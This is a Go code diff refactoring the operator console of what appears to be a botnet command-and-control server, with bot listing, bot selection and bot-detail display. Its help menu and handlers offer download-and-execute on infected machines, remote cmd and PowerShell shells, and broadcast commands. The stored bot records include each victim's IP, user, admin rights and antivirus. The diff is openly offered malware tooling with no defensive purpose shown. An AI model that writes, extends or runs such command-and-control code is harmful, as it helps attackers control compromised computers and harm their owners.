@@ -16,7 +16,6 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
-	"sync"
 	"time"
 
 	_ "github.com/go-sql-driver/mysql"
@@ -33,43 +32,12 @@ func show_banner() {
 	fmt.Println(banner)
 }
 
-func help_handler() {
-	fmt.Println("1. help/h: Show help menu")
-	fmt.Println("2. exec path/url [args]: Execute executable file or download from host and execute")
-	fmt.Println("3. cmd/pws: Remote cmd or powershell")
-	fmt.Println("4. list: Show all bots")
-	fmt.Println("5. info id: Show bot info which ID is id")
-	fmt.Println("6. select botid: Select a connected bot to operate")
-	fmt.Println("7. clear: Clean the screen")
-	fmt.Println("8. mode [broadcast]: Show current mode or switch to broadcast")
-}
-
-func select_handler(ary []string) {
-	if len(ary) < 2 {
-		fmt.Println("Usage: select botid, please enter help command")
-		return
-	}
-	// Check it's a number
-	botid, err := strconv.ParseInt(ary[1], 10, 64)
-	if err != nil || botid == 0 {
-		fmt.Println("You need to enter a bot id which is number")
-		return
-	}
-	// Check if bot in database record
-	var bot common.Client
-	if get_bot_info(botid, &bot) == false {
-		fmt.Println("[-] Bot doesn't exist, please enter right bot id")
-		return
-	}
-	// Switch mode
-	common.CurrentBot = botid
-	var mu sync.Mutex
-
-	mu.Lock()
+func show_bot_info(bot *common.Client) {
+	common.Mutex.Lock()
 	fmt.Println("🐾 --------------------------------------------------- 🐾")
-	fmt.Println("⚔️⚔️⚔️  Currrent bot: ")
+	fmt.Println("⚔️ ⚔️ ⚔️  Currrent bot: ")
 	fmt.Println("🐾 --------------------------------------------------- 🐾")
-	fmt.Printf("👣 ID: %d\n", botid)
+	fmt.Printf("👣 ID: %d\n", bot.Id)
 	fmt.Println("🏴 Guid: " + bot.Guid)
 	fmt.Println("🌍 IP: " + bot.Ip)
 	fmt.Println("👽 Who: " + bot.Whoami)
@@ -90,12 +58,45 @@ func select_handler(ary []string) {
 	fmt.Println("🔬 Lastseen: " + t.Format("2006-01-02 15:04:05"))
 	fmt.Println("👾 Version: v" + bot.Version)
 	fmt.Println("🐾 --------------------------------------------------- 🐾")
-	mu.Unlock()
+	common.Mutex.Unlock()
+}
+
+func help_handler() {
+	fmt.Println("1. help/h: Show help menu")
+	fmt.Println("2. exec path/url [args]: Execute executable file or download from host and execute")
+	fmt.Println("3. cmd/pws: Remote cmd or powershell")
+	fmt.Println("4. list: Show all bots")
+	fmt.Println("5. info id: Show bot info which ID is id")
+	fmt.Println("6. select botid: Select a connected bot to operate")
+	fmt.Println("7. clear: Clean the screen")
+	fmt.Println("8. mode [broadcast]: Show current mode or switch to broadcast")
+}
+
+func select_handler(ary []string) {
+	if len(ary) < 2 {
+		fmt.Println("[-] Usage: select botid, please enter help command")
+		return
+	}
+	// Check it's a number
+	botid, err := strconv.ParseInt(ary[1], 10, 64)
+	if err != nil || botid == 0 {
+		fmt.Println("[-] You need to enter a bot id which is number")
+		return
+	}
+	// Check if bot in database record
+	var bot common.Client
+	if !get_bot_info(botid, &bot) {
+		fmt.Println("[-] Bot doesn't exist, please enter right bot id")
+		return
+	}
+	// Switch mode
+	common.CurrentBot = botid
+	show_bot_info(&bot)
 }
 
 func exec_handler(ary []string) {
 	if len(ary) < 2 {
-		fmt.Println("Usage: exec path/url [args], please enter help command")
+		fmt.Println("[-] Usage: exec path/url [args], please enter help command")
 		return
 	}
 	var options string = ""
@@ -114,10 +115,10 @@ func exec_handler(ary []string) {
 	err := db1.QueryRow(common.Db, sqlStr).Scan(&command_id)
 	if err != nil {
 		if err == sql.ErrNoRows {
-			fmt.Println("No such command")
+			fmt.Println("[-] No such command")
 
 		} else {
-			fmt.Println("Command error")
+			fmt.Println("[-] Command error")
 		}
 		return
 	}
@@ -142,7 +143,17 @@ func info_handler(ary []string) {
 		fmt.Println("[-] Usage: info id, request latest bot information")
 		return
 	}
-	// TODO
+	botid, err := strconv.ParseInt(ary[1], 10, 64)
+	if err != nil {
+		fmt.Println("[-] You need to enter a bot id which is number")
+		return
+	}
+	var bot common.Client
+	if !get_bot_info(botid, &bot) {
+		fmt.Println("[-] Bot doesn't exist, please enter right bot id")
+		return
+	}
+	show_bot_info(&bot)
 }
 
 func get_bot_info(botid int64, bot *common.Client) bool {
@@ -175,19 +186,25 @@ func mode_handler(ary []string) {
 }
 
 func list_handler() {
-	sqlStr := "select * from clients"
+	sqlStr := "select id from clients"
 	var bot common.Client
+	var id int64
 	rows, err := db1.QueryRows(common.Db, sqlStr)
 	if err != nil {
 		log.Println(err.Error())
 		return
 	}
-	fmt.Printf("id | guid | token | ip | whoami | os | installdate | isadmin | antivirus | cpuinfo | gpuinfo | clientversion | lastseen | lastcommand |\n")
 	for rows.Next() {
-		rows.Scan(&bot)
-		fmt.Printf("%d %s %s %s %s %s %s %s %s %s %s %s %s %s\n",
-			bot.Id, bot.Guid, bot.Token, bot.Ip, bot.Whoami, bot.Os, bot.Installdate, bot.Isadmin,
-			bot.Antivirus, bot.Cpuinfo, bot.Gpuinfo, bot.Version, bot.Lastseen, bot.Lastcommand)
+		if rows.Scan(&id) != nil {
+			fmt.Println("[-] Error in showing botid = " + strconv.FormatInt(id, 10))
+			continue
+		}
+		if !get_bot_info(id, &bot) {
+			fmt.Println("[-] Bot " + strconv.FormatInt(id, 10) + " doesn't exist, please enter right bot id")
+			continue
+		}
+		show_bot_info(&bot)
+		fmt.Println("")
 	}
 }
 
